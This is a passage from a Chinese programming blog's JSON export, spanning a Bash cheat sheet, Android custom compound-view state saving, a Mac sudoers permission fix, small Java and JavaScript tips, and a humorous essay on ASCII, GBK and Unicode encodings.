txt 文件：```ls -l | grep \"\\.txt\" 以 ^EOF$ 作为结束标记从标准输入读取数据并覆盖 hello.py 123456789 cat &gt; hello.py &lt;&lt; EOF#!/usr/bin/env pythonfrom __future__ import print_functionimport sysprint(\"#stdout\", file=sys.stdout)print(\"#stderr\", file=sys.stderr)for line in sys.stdin: print(line, file=sys.stdout)EOF 重定向可以到输出，输入和错误输出 1234567 python hello.py &lt; \"input.in\"python hello.py &gt; \"output.out\"python hello.py 2&gt; \"error.err\"python hello.py &gt; \"output-and-error.log\" 2&gt;&amp;1python hello.py &gt; /dev/null 2&gt;&amp;1# &gt; 会覆盖已存在的文件， &gt;&gt; 会以累加的方式输出文件中。python hello.py &gt;&gt; \"output.out\" 2&gt;&gt; \"error.err\" 覆盖 output.out , 追加 error.err 并统计行数 12 info bash 'Basic Shell Features' 'Redirections' &gt; output.out 2&gt;&gt; error.errwc -l output.out error.err 运行指令并打印文件描述符 （比如 /dev/fd/123） 12 # 具体可查看： man fdecho &lt;(echo \"#helloworld\") 以 “#helloworld” 覆盖 output.out 1234 cat &gt; output.out &lt;(echo \"#helloworld\")echo \"#helloworld\" &gt; output.outecho \"#helloworld\" | cat &gt; output.outecho \"#helloworld\" | tee output.out &gt;/dev/null 清理临时文件并显示详情（增加 ‘-i’ 选项启用交互模式） 1 rm -v output.out error.err output-and-error.log 一个指令可用 $( ) 嵌套在另一个指令内部 以下的指令会打印当前目录下的目录和文件总数 1 echo &quot;There are $(ls | wc -l) items here.&quot; 反引号 `` 起相同作用，但不允许嵌套 优先使用 $() 1 echo &quot;There are `ls | wc -l` items here.&quot; Bash 的 case 语句与 Java 和 C++ 中的 switch 语句类似 123456 case \"$Variable\" in # 列出需要匹配的字符串 0) echo \"There is a zero.\";; 1) echo \"There is a one.\";; *) echo \"It is not null.\";;esac 循环遍历给定的参数序列 变量$Variable 的值会被打印 3 次 1234 for Variable in &#123;1..3&#125;do echo \"$Variable\"done 或传统的 “for循环” 1234 for ((a=1; a &lt;= 3; a++))do echo $adone 也可以用于文件 用 cat 输出 file1 和 file2 内容 1234 for Variable in file1 file2do cat \"$Variable\"done 或作用于其他命令的输出 对 ls 输出的文件执行 cat 指令 1234 for Output in $(ls)do cat \"$Output\"done while 循环 12345 while [ true ]do echo \"loop body here...\" breakdone 你也可以使用函数 定义函数 1234567 function foo ()&#123; echo \"Arguments work just like script arguments: $@\" echo \"And: $1 $2...\" echo \"This is a function\" return 0&#125; 更简单的方法 12345 bar ()&#123; echo \"Another way to declare functions!\" return 0&#125; 调用函数 1 foo &quot;My name is&quot; $Name 有很多有用的指令需要学习 打印 file.txt 的最后 10 行 1 tail -n 10 file.txt 打印 file.txt 的前 10 行 1 head -n 10 file.txt 将 file.txt 按行排序 1 sort file.txt 报告或忽略重复的行，用选项 -d 打印重复的行 1 uniq -d file.txt 打印每行中 ‘,’ 之前内容 1 cut -d &apos;,&apos; -f 1 file.txt 将 file.txt 文件所有 ‘okay’ 替换为 ‘great’, （兼容正则表达式） 1 sed -i &apos;s/okay/great/g&apos; file.txt 将 file.txt 中匹配正则的行打印到标准输出 这里打印以 “foo” 开头, “bar” 结尾的行 \"^foo.*bar$\" file.txt``` 1234 使用选项 &quot;-c&quot; 统计行数```grep -c &quot;^foo.*bar$&quot; file.txt 如果只是要按字面形式搜索字符串而不是按正则表达式，使用 fgrep (或 grep -F) 1 fgrep &quot;^foo.*bar$&quot; file.txt 以 bash 内建的 ‘help’ 指令阅读 Bash 自带文档 123456 helphelp helphelp forhelp returnhelp sourcehelp . 用 man 指令阅读相关的 Bash 手册 123 apropos bashman 1 bashman bash 用 info 指令查阅命令的 info 文档 （info 中按 ? 显示帮助信息） 1234 apropos info | grep '^info.*('man infoinfo infoinfo 5 info 阅读 Bash 的 info 文档 1234 info bashinfo bash 'Bash Features'info bash 6info --apropos bash 本文链接： http://www.meng.uno/articles/19f2d195/ 欢迎转载！","categories":[{"name":"Shells","slug":"Shells","permalink":"http://www.meng.uno/categories/Shells/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"http://www.meng.uno/tags/Shell/"},{"name":"Bash","slug":"Bash","permalink":"http://www.meng.uno/tags/Bash/"}]},{"title":"Android 自定义组合控件","slug":"android-compound-view","date":"2016-11-29T04:04:15.000Z","updated":"2018-03-20T10:07:03.298Z","comments":true,"path":"articles/db293350/","link":"","permalink":"http://www.meng.uno/articles/db293350/","excerpt":"概论： 1. 说在前面的话 2. 继承框架提供的布局 3. 布局文件 4. 构造方法 5. 状态保存 说在前面的话 自定义组合控件还是蛮简单的，你不用measure，layout，draw，当然你想的话也可以在组合控件上做这些操作的，不过大多数时候是没有必要的。组合控件的自定义属性和自定义view完全一样，这里比较难的是状态保存，因为一个页面可以有很多个你自定义的组合控件，但是系统的状态保存是依赖viewID的，所以你不能让ViewGroup来管理你的控件状态，只能自己管理了。当然，你也可能不需要状态保存，那就很简单了。 下面说说需要经历的步骤吧： * 让自定义的组合控件继承","text":"概论： 说在前面的话 继承框架提供的布局 布局文件 构造方法 状态保存 说在前面的话 自定义组合控件还是蛮简单的，你不用measure，layout，draw，当然你想的话也可以在组合控件上做这些操作的，不过大多数时候是没有必要的。组合控件的自定义属性和自定义view完全一样，这里比较难的是状态保存，因为一个页面可以有很多个你自定义的组合控件，但是系统的状态保存是依赖viewID的，所以你不能让ViewGroup来管理你的控件状态，只能自己管理了。当然，你也可能不需要状态保存，那就很简单了。 下面说说需要经历的步骤吧： 让自定义的组合控件继承框架提供的布局，如LinearLayout,RelativeLayout等。 把你组合控件里面的子控件放到一个布局文件中，然后在组合控件的构造方法中加载进来。 采用merge作为你布局文件的根，这样可以减少嵌套层次。 接下来是比较难的状态保存。 自定义属性，这个和自定义view一样。 继承框架提供的布局 1 public class CompoundControl extends LinearLayout implements android.view.View.OnClickListener &#123; ... ## 布局文件 样例如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;merge xmlns:android=\"http://schemas.android.com/apk/res/android\"&gt;&lt;LinearLayout android:orientation=\"horizontal\" android:layout_width=\"fill_parent\" android:layout_height=\"wrap_content\"&gt;&lt;TextView android:id=\"@+id/fromDate\" android:layout_width=\"0dp\" android:layout_height=\"wrap_content\" android:text=\"Enter From Date\" android:layout_weight=\"70\" /&gt;&lt;Button android:id=\"@+id/fromButton\" android:layout_width=\"0dp\" android:layout_height=\"wrap_content\" android:text=\"Go\" android:layout_weight=\"30\" /&gt;&lt;/LinearLayout&gt; &lt;LinearLayout android:orientation=\"horizontal\" android:layout_width=\"fill_parent\" android:layout_height=\"wrap_content\"&gt;&lt;TextView android:id=\"@+id/toDate\" android:layout_width=\"0dp\" android:layout_height=\"wrap_content\" android:text=\"Enter To Date\" android:layout_weight=\"70\" /&gt;&lt;Button android:id=\"@+id/toButton\" android:layout_width=\"0dp\" android:layout_height=\"wrap_content\" android:text=\"Go\" android:layout_weight=\"30\" /&gt;&lt;/LinearLayout&gt; &lt;/merge&gt; 构造方法 12345678910111213141516171819202122232425262728293031 public DurationControl(Context context) &#123; super(context); initialize(context);&#125;public DurationControl(Context context, AttributeSet attrs, int defStyle) &#123; super(context, attrs, defStyle); TypedArray t = context.obtainStyledAttributes(attrs, R.styleable.DurationComponent, 0, 0); durationUnits = t.getInt(R.styleable.DurationComponent_durationUnits, durationUnits); t.recycle(); initialize(context);&#125;public DurationControl(Context context, AttributeSet attrs) &#123; this(context, attrs, 0);&#125;private void initialize(Context context) &#123; LayoutInflater lif = (LayoutInflater) context .getSystemService(Context.LAYOUT_INFLATER_SERVICE); lif.inflate(R.layout.duration_view_layout, this); Button b = (Button) this.findViewById(R.id.fromButton); b.setOnClickListener(this); b = (Button) this.findViewById(R.id.toButton); b.setOnClickListener(this); this.setSaveEnabled(true);&#125; 状态保存 前面说过了，由于你控件可能会在一个页面出现多次，所以viewID会重复，这样系统就没办法帮你管理状态了。所以如果你要管理children的状态，就必须亲自动手了，而不是让children自己管理自己的状态。 要想管理children的状态，你必须要知道ViewGroup的四个状态管理的方法，他们是： 12345678910111213 dispatchSaveInstanceState dispatchFreezeSelfOnly dispatchRestoreInstanceState dispatchThawSelfOnly ``` &gt; A ViewGroup uses dispatchSaveInstanceState to first save its own state by calling super (view’s) dispatchSaveInstanceState, which in turn triggers onSaveInstanceState on itself and then calls the dispatchSaveInstanceState for each of its children. If the children are plain views and not ViewGroups, this will result in having their onSaveInstanceState called. Listing 2-12 presents the pseudo code for how these key methods are meshed together. ```java ViewGroup.dispatchSaveInstanceState() &#123; View.dispatchSaveInstanceState() ...ends up calling its own ViewGroup.onSaveInstanceState() Children.dispatchSaveInstanceState() ...ends up calling children's onSaveInstanceState()&#125; View.dispatchSaveInstanceState() &#123; onSaveInstanceState() &#125; ViewGroup.dispatchFreezeSelfOnly() &#123; View.dispatchSaveInstanceState() ...ends up calling ViewGroup.onSaveInstanceState()&#125;``` 技巧在于`dispatchFreezeSelfOnly`,这个ViewGroup方法只是简单的保存了ViewGroup的状态，这同样也发生在对应的恢复`dispatchThawSelfOnly`上。所以你可以重写ViewGroup的方法来阻止children自己管理状态。如下所示：```java@Override protected void dispatchSaveInstanceState(SparseArray&lt;Parcelable&gt; container) &#123; //Don't call this so that children won't be explicitly saved //super.dispatchSaveInstanceState(container); //Call your self onsavedinstancestate super.dispatchFreezeSelfOnly(container); &#125; @Override protected void dispatchRestoreInstanceState( SparseArray&lt;Parcelable&gt; container) &#123; //Don't call this so that children won't be explicitly saved //super.dispatchRestoreInstanceState(container); super.dispatchThawSelfOnly(container); &#125; 接下来就需要ViewGroup在onSaveInstanceState 和 onRestoreInstanceState中管理children的状态了，实例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122 @Overrideprotected void dispatchSaveInstanceState(SparseArray&lt;Parcelable&gt; container) &#123; // Don't call this so that children won't be explicitly saved // super.dispatchSaveInstanceState(container); // Call your self onsavedinstancestate super.dispatchFreezeSelfOnly(container); Log.d(tag, \"in dispatchSaveInstanceState\");&#125;@Overrideprotected void dispatchRestoreInstanceState( SparseArray&lt;Parcelable&gt; container) &#123; // Don't call this so that children won't be explicitly saved // .super.dispatchRestoreInstanceState(container); super.dispatchThawSelfOnly(container); Log.d(tag, \"in dispatchRestoreInstanceState\");&#125;@Overrideprotected void onRestoreInstanceState(Parcelable state) &#123; Log.d(tag, \"in onRestoreInstanceState\"); if (!(state instanceof SavedState)) &#123; super.onRestoreInstanceState(state); return; &#125; // it is our state SavedState ss = (SavedState) state; // Peel it and give the child to the super class super.onRestoreInstanceState(ss.getSuperState()); // this.fromDate = ss.fromDate; // this.toDate= ss.toDate; this.setFromDate(ss.fromDate); this.setToDate(ss.toDate);&#125;@Overrideprotected Parcelable onSaveInstanceState() &#123; Log.d(tag, \"in onSaveInstanceState\"); Parcelable superState = super.onSaveInstanceState(); SavedState ss = new SavedState(superState); ss.fromDate = this.fromDate; ss.toDate = this.toDate; return ss;&#125;/* * *************************************************************** * Saved State inner static class * *************************************************************** */public static class SavedState extends BaseSavedState &#123; // null values are allowed private Calendar fromDate; private Calendar toDate; SavedState(Parcelable superState) &#123; super(superState); &#125; SavedState(Parcelable superState, Calendar inFromDate, Calendar inToDate) &#123; super(superState); fromDate = inFromDate; toDate = inToDate; &#125; @Override public void writeToParcel(Parcel out, int flags) &#123; super.writeToParcel(out, flags); if (fromDate != null) &#123; out.writeLong(fromDate.getTimeInMillis()); &#125; else &#123; out.writeLong(-1L); &#125; if (fromDate != null) &#123; out.writeLong(toDate.getTimeInMillis()); &#125; else &#123; out.writeLong(-1L); &#125; &#125; @Override public String toString() &#123; StringBuffer sb = new StringBuffer(\"fromDate:\" + DurationControl.getDateString(fromDate)); sb.append(\"fromDate:\" + DurationControl.getDateString(toDate)); return sb.toString(); &#125; @SuppressWarnings(\"hiding\") public static final Parcelable.Creator&lt;SavedState&gt; CREATOR = new Parcelable.Creator&lt;SavedState&gt;() &#123; public SavedState createFromParcel(Parcel in) &#123; return new SavedState(in); &#125; public SavedState[] newArray(int size) &#123; return new SavedState[size]; &#125; &#125;; // Read back the values private SavedState(Parcel in) &#123; super(in); // Read the from date long lFromDate = in.readLong(); if (lFromDate == -1) &#123; fromDate = null; &#125; else &#123; fromDate = Calendar.getInstance(); fromDate.setTimeInMillis(lFromDate); &#125; // Read the from date long lToDate = in.readLong(); if (lFromDate == -1) &#123; toDate = null; &#125; else &#123; toDate = Calendar.getInstance(); toDate.setTimeInMillis(lToDate); &#125; &#125;&#125;// eof-state-class 其实这就相当于把整个组合控件当成一个View来管理 本文链接： http://www.meng.uno/articles/db293350/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"customView","slug":"customView","permalink":"http://www.meng.uno/tags/customView/"}]},{"title":"Java web中的浮出层使用","slug":"iframe","date":"2016-11-23T05:30:45.000Z","updated":"2018-02-09T10:46:20.923Z","comments":true,"path":"articles/fa7b6881/","link":"","permalink":"http://www.meng.uno/articles/fa7b6881/","excerpt":"进行《软件工程》大项目时，遇到想在主页上仿Google首页上的那种“一个输入框+两个按钮”，同时一个按钮搜索、一个按钮上传文件，于是到网上查了好久，都没有关于“一个按钮实现文件上传”的功能介绍，最后只能使用“通过一个浮出层弹出上传文件”这种方式，下面贴出JavaScript代码。 在按钮中使用时只需要这样使用就行： 1 点击进入我的博客 JavaScript代码如下： 1 2 3 4 5 6 7 8 9 10 11 12 function _","text":"进行《软件工程》大项目时，遇到想在主页上仿Google首页上的那种“一个输入框+两个按钮”，同时一个按钮搜索、一个按钮上传文件，于是到网上查了好久，都没有关于“一个按钮实现文件上传”的功能介绍，最后只能使用“通过一个浮出层弹出上传文件”这种方式，下面贴出JavaScript代码。 在按钮中使用时只需要这样使用就行： 1 &lt;a href=\"javascript:_iframe() %&gt;')\" class=\"button\"&gt;点击进入我的博客&lt;/a&gt; JavaScript代码如下： 123456789101112 &lt;script&gt; function _iframe() &#123; zeroModal.show(&#123; title: '我的博客', iframe: true, url: 'http://www.meng.uno', width: '60%', height: '60%', cancel: true &#125;); &#125; &lt;/script&gt; 本文链接： http://www.meng.uno/articles/fa7b6881/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"Mac sudo命令无法使用","slug":"sudo_error","date":"2016-11-19T03:29:25.000Z","updated":"2018-02-11T14:13:13.698Z","comments":true,"path":"articles/e3b9b515/","link":"","permalink":"http://www.meng.uno/articles/e3b9b515/","excerpt":"在之前好长一段时间，不知道因为我改动了哪个文件的权限，导致sudo命令无法使用，每次启动sudo总会报什么权限不对的错误，在网上找了好久都没找到解决办法，包括stackoverflow这么牛逼哄哄的网站上面问题人采纳的方案都无济于事，今天闲来无事，又想解决这个问题，这次我是直接进苹果的“Mac 支持”上看的，发现Mac有个单用户模式（在此给出连接），我进入单用户模式，然后就是一个黑框框，在里面输入以下几条命令： 1 2 3 mount -uw / chown root:wheel /etc/sudoers chmod 440 /etc/sudoers 大致就是恢复文件权限之类的吧，结","text":"在之前好长一段时间，不知道因为我改动了哪个文件的权限，导致sudo命令无法使用，每次启动sudo总会报什么权限不对的错误，在网上找了好久都没找到解决办法，包括stackoverflow这么牛逼哄哄的网站上面问题人采纳的方案都无济于事，今天闲来无事，又想解决这个问题，这次我是直接进苹果的“Mac 支持”上看的，发现Mac有个单用户模式（在此给出连接），我进入单用户模式，然后就是一个黑框框，在里面输入以下几条命令： 123 mount -uw /chown root:wheel /etc/sudoerschmod 440 /etc/sudoers 大致就是恢复文件权限之类的吧，结果reboot之后，居然就好了😝。 特此记录以下，给出现同种问题的小伙伴提供下。 其实，我的MySQL也有问题，我正准备进MySQL官网看看有什么解决办法😂，所以说，有什么事，能看懂英文的，尽量去软件官网找解决办法！！ 本文链接： http://www.meng.uno/articles/e3b9b515/ 欢迎转载！","categories":[{"name":"sudo","slug":"sudo","permalink":"http://www.meng.uno/categories/sudo/"},{"name":"error","slug":"sudo/error","permalink":"http://www.meng.uno/categories/sudo/error/"}],"tags":[{"name":"sudo","slug":"sudo","permalink":"http://www.meng.uno/tags/sudo/"},{"name":"error","slug":"error","permalink":"http://www.meng.uno/tags/error/"}]},{"title":"String的“+”操作分析","slug":"string_plus","date":"2016-11-01T08:39:36.000Z","updated":"2018-02-10T13:09:13.130Z","comments":true,"path":"articles/fc57b387/","link":"","permalink":"http://www.meng.uno/articles/fc57b387/","excerpt":"起源 昨天，我和队友讨论字符串拼接问题时，他提到了这个问题：直接“+”操作好像是生成了临时的一个新String，然后拼接，再复制给原来的String。带着这个问题，我查了下，得出以下的结论。 结论 我查到的信息之一这样说：因为“+”拼接字符串，每拼接一次都是再内存重新开辟一个新的内存区域（堆里边）,然后把得到的新的字符串存在这块内存，字符串如果很大，循环次多又多，那么浪费了很多时间和空间的开销。 我查到的信息之二这么说：当拼接次数较少时，其实编译器会将其优化为StringBuilder类型，只是当拼接次数特别多时，编译器优化时将会产生过多的StringBuilder类型，从而导致空间浪费。","text":"起源 昨天，我和队友讨论字符串拼接问题时，他提到了这个问题：直接“+”操作好像是生成了临时的一个新String，然后拼接，再复制给原来的String。带着这个问题，我查了下，得出以下的结论。 结论 我查到的信息之一这样说：因为“+”拼接字符串，每拼接一次都是再内存重新开辟一个新的内存区域（堆里边）,然后把得到的新的字符串存在这块内存，字符串如果很大，循环次多又多，那么浪费了很多时间和空间的开销。 我查到的信息之二这么说：当拼接次数较少时，其实编译器会将其优化为StringBuilder类型，只是当拼接次数特别多时，编译器优化时将会产生过多的StringBuilder类型，从而导致空间浪费。 策略 当拼接次数较少时，我们可以直接使用“+”操作，而当拼接数量较大时，我们最好使用StringBuilder类型。 操作 123 StringBuilder SB = new StringBuilder();SB.append(……);String Result = SB.toString(); 本文链接： http://www.meng.uno/articles/fc57b387/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"},{"name":"String","slug":"Java开发Tips/String","permalink":"http://www.meng.uno/categories/Java开发Tips/String/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"将多个input合并成一个字符串提交给后台","slug":"inputaswhole","date":"2016-10-29T04:50:24.000Z","updated":"2018-02-09T10:46:20.924Z","comments":true,"path":"articles/f12d3e70/","link":"","permalink":"http://www.meng.uno/articles/f12d3e70/","excerpt":"需求 我在做我们的《软件工程》作业时，遇到了这样一个问题：我们需要打开一个表，这个表的列数不确定，但要增加增加行的操作。 实现 于是，需求产生了，我需要将前端的多个input标签内容合并成一个字符串来进行提交，我看了几个比较牛的方法（json、ognl……）但是好像与我们的需求偏的有点远（如果可以实现，欢迎留言），最后，没办法只能自己想，由于我还是会一点JavaScript的，所以我就想用JavaScript实现，在尝试了很多次之后，终于成功了，在此先贴上代码。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24","text":"需求 我在做我们的《软件工程》作业时，遇到了这样一个问题：我们需要打开一个表，这个表的列数不确定，但要增加增加行的操作。 实现 于是，需求产生了，我需要将前端的多个input标签内容合并成一个字符串来进行提交，我看了几个比较牛的方法（json、ognl……）但是好像与我们的需求偏的有点远（如果可以实现，欢迎留言），最后，没办法只能自己想，由于我还是会一点JavaScript的，所以我就想用JavaScript实现，在尝试了很多次之后，终于成功了，在此先贴上代码。 123456789101112131415161718192021222324 &lt;script type=\"text/javascript\"&gt;function n(n)&#123; var num=\"\"; for(var i=0;i&lt;n;i++)&#123; num += document.getElementById(\"num\"+i).value; &#125;document.getElementById(\"result\").value = num;&#125;&lt;/script&gt;&lt;% int num=3;%&gt;&lt;form action=\"addAction\"&gt;&lt;input id=\"num\" name=\"num\" value=&lt;%=num %&gt; type=\"text\"&gt;&lt;% for(int i=0;i&lt;num;i++)&#123;%&gt;&lt;input id=\"num&lt;%=i %&gt;\" type=\"text\" onblur=\"n(&lt;%=num%&gt;)\"&gt;&lt;% &#125;%&gt;&lt;input name=\"str\" id=\"result\" type=\"hidden\" &gt;&lt;button &gt;提交&lt;/button&gt;&lt;/form&gt; 分析 最后来分析，到底是怎么实现的，其实道理特别简单，就是JavaScript获取input的个数，然后一个循环，将所有input合并，并且给到一个“hidden”的input里，在后台接收这个input就可以了。 本文链接： http://www.meng.uno/articles/f12d3e70/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"Git学习小结","slug":"use_git","date":"2016-10-21T07:50:24.000Z","updated":"2018-02-09T10:46:20.940Z","comments":true,"path":"articles/5850713f/","link":"","permalink":"http://www.meng.uno/articles/5850713f/","excerpt":"从Git官方教程出发 进入git教程官网我们可以发现，主要从这几个方面来讲解的（几乎所有你能搜到的博客都是这么一成不变！）： 建立项目 1. init 2. clone 基本操作 3. add 4. status 5. diff 6. commit 7. reset 8. rm 9. mv 分支管理 10. branch 11. checkout 12. merge 13. mergetool 14. log 15. stash 16. tag 分享与更新 17. fetch 18. pull 19. push 20. remote 21. s","text":"从Git官方教程出发 进入git教程官网我们可以发现，主要从这几个方面来讲解的（几乎所有你能搜到的博客都是这么一成不变！）： 建立项目 init clone 基本操作 add status diff commit reset rm mv 分支管理 branch checkout merge mergetool log stash tag 分享与更新 fetch pull push remote submodule 看到这里，我们基本的git学习就可以结束了，要问为什么我只写标题而不写内容，我只想说，我写这篇博客只是为了通过自己写一遍命令来复习一遍而已。😝 本文链接： http://www.meng.uno/articles/5850713f/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"Unicode和UTF-8的区别","slug":"utf-8","date":"2016-10-21T04:50:24.000Z","updated":"2018-03-26T05:20:00.982Z","comments":true,"path":"articles/97858b96/","link":"","permalink":"http://www.meng.uno/articles/97858b96/","excerpt":"很久很久以前，有一群人，他们决定用8个可以开合的晶体管来组合成不同的状态，以表示世界上的万物。他们看到8个开关状态是好的，于是他们把这称为\"字节\"。 再后来，他们又做了一些可以处理这些字节的机器，机器开动了，可以用字节来组合出很多状态，状态开始变来变去。他们看到这样是好的，于是它们就这机器称为\"计算机\"。 开始计算机只在美国用。八位的字节一共可以组合出256(2的8次方)种不同的状态。 他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作。遇上00x10, 终端就换行，遇上0x07, 终端就向人们嘟嘟叫，例好遇上0","text":"很久很久以前，有一群人，他们决定用8个可以开合的晶体管来组合成不同的状态，以表示世界上的万物。他们看到8个开关状态是好的，于是他们把这称为&quot;字节&quot;。 再后来，他们又做了一些可以处理这些字节的机器，机器开动了，可以用字节来组合出很多状态，状态开始变来变去。他们看到这样是好的，于是它们就这机器称为&quot;计算机&quot;。 开始计算机只在美国用。八位的字节一共可以组合出256(2的8次方)种不同的状态。 他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作。遇上00x10, 终端就换行，遇上0x07, 终端就向人们嘟嘟叫，例好遇上0x1b, 打印机就打印反白的字，或者终端就用彩色显示字母。他们看到这样很好，于是就把这些0x20以下的字节状态称为&quot;控制码&quot;。 他们又把所有的空格、标点符号、数字、大小写字母分别用连续的字节状态表示，一直编到了第127号，这样计算机就可以用不同字节来存储英语的文字了。大家看到这样，都感觉很好，于是大家都把这个方案叫做 ANSI 的&quot;Ascii&quot;编码（American Standard Code for Information Interchange，美国信息互换标准代码）。当时世界上所有的计算机都用同样的ASCII方案来保存英文文字。 后来，就像建造巴比伦塔一样，世界各地的都开始使用计算机，但是很多国家用的不是英文，他们的字母里有许多是ASCII里没有的，为了可以在计算机保存他们的文字，他们决定采用127号之后的空位来表示这些新的字母、符号，还加入了很多画表格时需要用下到的横线、竖线、交叉等形状，一直把序号编到了最后一个状态255。从128到255这一页的字符集被称&quot;扩展字符集&quot;。从此之后，贪婪的人类再没有新的状态可以用了，美帝国主义可能没有想到还有第三世界国家的人们也希望可以用到计算机吧！ 等中国人们得到计算机时，已经没有可以利用的字节状态来表示汉字，况且有6000多个常用汉字需要保存呢。但是这难不倒智慧的中国人民，我们不客气地把那些127号之后的奇异符号们直接取消掉, 规定：一个小于127的字符的意义与原来相同，但两个大 于127的字符连在一起时，就表示一个汉字，前面的一个字节（他称之为高字节）从0xA1用到0xF7，后面一个字节（低字节）从0xA1到0xFE，这样我们就可以组合出大约7000多个简体汉字了。在这些编码里，我们还把数学符号、罗马希腊的字母、日文的假名们都编进去了，连在 ASCII 里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的&quot;全角&quot;字符，而原来在127号以下的那些就叫&quot;半角&quot;字符了。 中国人民看到这样很不错，于是就把这种汉字方案叫做 “GB2312”。GB2312 是对 ASCII 的中文扩展。 但是中国的汉字太多了，我们很快就就发现有许多人的人名没有办法在这里打出来，特别是某些很会麻烦别人的国家领导人。于是我们不得不继续把 GB2312 没有用到的码位找出来老实不客气地用上。 后来还是不够用，于是干脆不再要求低字节一定是127号之后的内码，只要第一个字节是大于127就固定表示这是一个汉字的开始，不管后面跟的是不是扩展字符集里的内容。结果扩展之后的编码方案被称为 GBK 标准，GBK 包括了 GB2312 的所有内容，同时又增加了近20000个新的汉字（包括繁体字）和符号。 后来少数民族也要用电脑了，于是我们再扩展，又加了几千个新的少数民族的字，GBK 扩成了 GB18030。从此之后，中华民族的文化就可以在计算机时代中传承了。 中国的程序员们看到这一系列汉字编码的标准是好的，于是通称他们叫做 “DBCS”（Double Byte Charecter Set 双字节字符集）。在DBCS系列标准里，最大的特点是两字节长的汉字字符和一字节长的英文字符并存于同一套编码方案里，因此他们写的程序为了支持中文处理，必须要注意字串里的每一个字节的值，如果这个值是大于127的，那么就认为一个双字节字符集里的字符出现了。那时候凡是受过加持，会编程的计算机僧侣们都要每天念下面这个咒语数百遍： “一个汉字算两个英文字符！一个汉字算两个英文字符……” 因为当时各个国家都像中国这样搞出一套自己的编码标准，结果互相之间谁也不懂谁的编码，谁也不支持别人的编码，连大陆和台湾这样只相隔了150海里，使用着同一种语言的兄弟地区，也分别采用了不同的 DBCS 编码方案——当时的中国人想让电脑显示汉字，就必须装上一个&quot;汉字系统&quot;，专门用来处理汉字的显示、输入的问题，但是那个台湾的愚昧封建人士写的算命程序就必须加装另一套支持 BIG5 编码的什么&quot;倚天汉字系统&quot;才可以用，装错了字符系统，显示就会乱了套！这怎么办？而且世界民族之林中还有那些一时用不上电脑的穷苦人民，他们的文字又怎么办？ 真是计算机的巴比 伦塔命题啊！ 正在这时，大天使加百列及时出现了——一个叫 ISO （国际标谁化组织）的国际组织决定着手解决这个问题。他们采用的方法很简单：废了所有的地区性编码方案，重新搞一个包括了地球上所有文化、所有字母和符号的编码！他们打算叫它&quot;Universal Multiple-Octet Coded Character Set&quot;，简称 UCS, 俗称 “UNICODE”。 UNICODE 开始制订时，计算机的存储器容量极大地发展了，空间再也不成为问题了。于是 ISO 就直接规定必须用两个字节，也就是16位来统一表示所有的字符，对于ascii里的那些“半角”字符，UNICODE 包持其原编码不变，只是将其长度由原来的8位扩展为16位，而其他文化和语言的字符则全部重新统一编码。由于&quot;半角&quot;英文符号只需要用到低8位，所以其高8位永远是0，因此这种大气的方案在保存英文文本时会多浪费一倍的空间。 这时候，从旧社会里走过来的程序员开始发现一个奇怪的现象：他们的strlen函数靠不住了，一个汉字不再是相当于两个字符了，而是一个！是的，从 UNICODE 开始，无论是半角的英文字母，还是全角的汉字，它们都是统一的&quot;一个字符&quot;！同时，也都是统一的&quot;两个字节&quot;，请注意&quot;字符&quot;和&quot;字节&quot;两个术语的不同，“字节”是一个8位的物理存贮单元，而“字符”则是一个文化相关的符号。在UNICODE 中，一个字符就是两个字节。一个汉字算两个英文字符的时代已经快过去了。 从前多种字符集存在时，那些做多语言软件的公司遇上过很大麻烦，他们为了在不同的国家销售同一套软件，就不得不在区域化软件时也加持那个双字节字符集咒语，不仅要处处小心不要搞错，还要把软件中的文字在不同的字符集中转来转去。UNICODE 对于他们来说是一个很好的一揽子解决方案，于是从 Windows NT 开始，MS 趁机把它们的操作系统改了一遍，把所有的核心代码都改成了用 UNICODE 方式工作的版本，从这时开始，WINDOWS 系统终于无需要加装各种本土语言系统，就可以显示全世界上所有文化的字符了。 但是，UNICODE 在制订时没有考虑与任何一种现有的编码方案保持兼容，这使得 GBK 与UNICODE 在汉字的内码编排上完全是不一样的，没有一种简单的算术方法可以把文本内容从UNICODE编码和另一种编码进行转换，这种转换必须通过查表来进行。 如前所述，UNICODE 是用两个字节来表示为一个字符，他总共可以组合出65535不同的字符，这大概已经可以覆盖世界上所有文化的符号。如果还不够也没有关系，ISO已经准备了UCS-4方案，说简单了就是四个字节来表示一个字符，这样我们就可以组合出21亿个不同的字符出来（最高位有其他用途），这大概可以用到银 河联邦成立那一天吧！ UNICODE 来到时，一起到来的还有计算机网络的兴起，UNICODE 如何在网络上传输也是一个必须考虑的问题，于是面向传输的众多 UTF（UCS Transfer Format）标准出现了，顾名思义，UTF8就是每次8个位传输数据，而UTF16就是每次16个位，只不过为了传输时的可靠性，从UNICODE到UTF时并不是直接的对应，而是要过一些算法和规则来转换。 